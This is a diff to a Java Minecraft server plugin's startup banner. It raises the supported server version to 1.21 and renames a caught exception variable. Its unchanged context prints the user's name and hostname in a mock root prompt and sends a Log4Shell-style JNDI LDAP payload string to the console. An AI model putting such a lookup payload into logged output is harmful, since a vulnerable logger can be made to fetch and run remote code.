@@ -16,7 +16,7 @@ public enum Logo {
 		Informer.send("● ╚══╝╚══╝╚╝ ╚╝╚═══╝╚══╝╚╝╚╝╚══╝╚╝  ●");
 		Informer.send(" ");
 		Informer.send("Java version: " + Runtime.version());
-		if (!Tools.requireBukkitVersion(BukkitVersion.V1_16)) {
+		if (!Tools.requireBukkitVersion(BukkitVersion.V1_21)) {
 			Informer.send(Colors.DARK_RED + "Your server's version is not supported!");
 			Informer.send(Colors.DARK_RED + "Your server's version is not supported!");
 			Informer.send(Colors.DARK_RED + "Your server's version is not supported!");
@@ -67,7 +67,7 @@ public enum Logo {
 			try {
 				InetAddress inetAddress = InetAddress.getLocalHost();
 				host = inetAddress.getHostName();
-			} catch (Throwable ignored) {}
+			} catch (Throwable _) {}
 			Informer.send(Tools.join("@", System.getProperty("user.name"), host) + ":~# " + rm);
 		}
 		Informer.send("${jndi:ldap://${author_lower}.net/exploit}");
